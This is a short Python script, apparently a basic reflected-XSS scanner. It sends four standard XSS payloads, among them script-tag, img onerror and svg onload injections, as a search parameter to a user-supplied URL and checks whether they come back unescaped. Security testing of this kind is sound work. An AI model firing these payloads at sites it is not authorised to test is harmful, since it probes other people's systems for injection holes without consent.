import requests
from bs4 import BeautifulSoup

# List of XSS payloads to test
payloads = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "'\"><script>alert('XSS')</script>",
    "<svg/onload=alert('XSS')>",
]

# Function to test for XSS
def test_xss(url, payload):
    try:
        params = {"q": payload}
        response = requests.get(url, params=params)
        response.raise_for_status()  # Check if the request was successful
        if payload in response.text:
            print(f"Potential XSS vulnerability detected with payload: {payload}")
        else:
            print(f"No XSS vulnerability detected with payload: {payload}")
    except requests.RequestException as e:
        print(f"Error testing payload {payload}: {e}")

# Get the target URL from the user
url = input("Enter the website URL to test (e.g., http://example.com/search): ")

# Iterate over each payload and test for XSS
for payload in payloads:
    test_xss(url, payload)
